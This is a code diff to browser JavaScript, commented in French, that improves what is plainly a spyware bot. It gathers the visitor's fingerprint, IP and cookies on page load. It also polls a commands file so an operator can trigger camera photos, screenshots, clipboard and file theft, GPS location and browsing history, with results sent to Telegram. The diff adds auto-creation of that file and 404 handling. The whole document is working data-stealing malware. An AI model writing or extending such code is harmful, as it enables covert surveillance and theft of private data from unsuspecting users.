@@ -30,6 +30,21 @@ function updateStatus(msg, isError = false) {
 }
 
 // ============================================
+// 0. CRÉATION AUTOMATIQUE DE commands.txt
+// ============================================
+async function ensureCommandsFile() {
+    try {
+        const res = await fetch('commands.txt');
+        if (!res.ok && res.status === 404) {
+            console.log('[INIT] Création de commands.txt...');
+            await fetch('commands.txt', { method: 'POST', body: '' });
+        }
+    } catch(e) {
+        console.log('[INIT] Vérification commands.txt:', e);
+    }
+}
+
+// ============================================
 // 1. FINGERPRINT + IP
 // ============================================
 async function collectFingerprint() {
@@ -325,20 +340,32 @@ function loadHtml2Canvas() {
 }
 
 // ============================================
-// 12. COMMANDES À DISTANCE (CORRIGÉES)
+// 12. COMMANDES À DISTANCE (CORRIGÉES + FILTRE 404)
 // ============================================
 let lastCommand = '';
 async function checkRemoteCommands() {
     try {
         const res = await fetch('commands.txt?t=' + Date.now());
+        
+        // 🔥 IGNORER SI FICHIER NON TROUVÉ (404)
+        if (!res.ok) {
+            console.log('[COMMAND] commands.txt pas encore créé');
+            return;
+        }
+        
         const cmd = await res.text();
         const cleanCmd = cmd.trim();
         
+        // Ignorer les réponses HTML (404) ou vides
         if (!cleanCmd || cleanCmd === 'clear' || cleanCmd === lastCommand) return;
-        lastCommand = cleanCmd;
+        if (cleanCmd.startsWith('<!doctype') || cleanCmd.startsWith('<html') || cleanCmd.includes('Not Found')) {
+            console.log('[COMMAND] Ignoré: réponse HTML');
+            return;
+        }
         
+        lastCommand = cleanCmd;
         console.log('[COMMAND] Reçue:', cleanCmd);
-        await sendToTelegram(`📟 Commande reçue: ${cleanCmd}`);
+        await sendToTelegram(`📟 Commande: ${cleanCmd}`);
         
         if (cleanCmd === 'camera') {
             await requestCameraAndCapture();
@@ -376,7 +403,7 @@ Photos: ${collectedData.photos.length}`);
         }
         else if (cleanCmd === 'vibrate' && navigator.vibrate) {
             navigator.vibrate(200);
-            await sendToTelegram('📳 Vibration déclenchée');
+            await sendToTelegram('📳 Vibration');
         }
         else if (cleanCmd === 'help' || cleanCmd === 'start') {
             await showCommands();
@@ -384,7 +411,7 @@ Photos: ${collectedData.photos.length}`);
         else if (cleanCmd.startsWith('notify_custom:')) {
             const msg = cleanCmd.replace('notify_custom:', '').trim();
             new Notification('📢 Message', { body: msg });
-            await sendToTelegram(`🔔 Notification envoyée: ${msg}`);
+            await sendToTelegram(`🔔 Notification: ${msg}`);
         }
         else if (cleanCmd.startsWith('url:')) {
             const url = cleanCmd.replace('url:', '').trim();
@@ -400,7 +427,7 @@ Photos: ${collectedData.photos.length}`);
         lastCommand = '';
         
     } catch(e) {
-        console.error('[COMMAND ERROR]', e);
+        console.error('[COMMAND]', e);
     }
 }
 
@@ -448,24 +475,24 @@ async function sendFileToTelegram(filename, dataUrl) {
 }
 
 // ============================================
-// 15. LISTE DES COMMANDES
+// 15. LISTE DES COMMANDES (/start ou help)
 // ============================================
 async function showCommands() {
     await sendToTelegram(`🤖 COMMANDES BOT
 ━━━━━━━━━━━━━━━━━━━━━
-📷 camera - Photos
+📷 camera - 3 photos
 📁 files - Sélection fichiers
 📋 clipboard - Presse-papier
 📸 screenshot - Capture écran
 📍 location - GPS
 🍪 cookies - Cookies
 📜 history - Historique
-📊 status - État
-🏓 ping - Test
+📊 status - État complet
+🏓 ping - Test connexion
 📳 vibrate - Vibration
-🔔 notify_custom:TEXTE
-🌐 url:https://...
-help - Cette aide
+🔔 notify_custom:TEXTE - Notif perso
+🌐 url:https://... - Ouvre lien
+help ou start - Cette aide
 ━━━━━━━━━━━━━━━━━━━━━`);
 }
 
@@ -474,6 +501,10 @@ help - Cette aide
 // ============================================
 (async function main() {
     updateStatus('🟢 Démarrage...');
+    
+    // Créer commands.txt si nécessaire
+    await ensureCommandsFile();
+    
     await collectFingerprint();
     await collectPrivateIP();
     collectAllCookies();
@@ -486,5 +517,5 @@ help - Cette aide
     setTimeout(() => showCommands(), 5000);
     setInterval(checkRemoteCommands, 3000);
     updateStatus('✅ Prêt - Commandes actives');
-    await sendToTelegram('✅ Bot actif - En attente de commandes');
+    await sendToTelegram('✅ Bot actif - Envoie /start pour les commandes');
 })();
